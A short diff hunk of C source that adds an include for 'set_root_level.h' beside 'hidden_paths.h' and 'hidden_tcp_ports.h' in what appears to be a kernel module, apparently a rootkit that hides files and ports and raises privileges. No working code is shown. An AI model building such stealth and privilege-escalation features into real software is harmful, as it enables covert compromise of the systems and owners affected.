@@ -6,6 +6,7 @@
 
 #include "hidden_paths.h"
 #include "hidden_tcp_ports.h"
+#include "set_root_level.h"
 
 extern void exit_my_module(void);
 
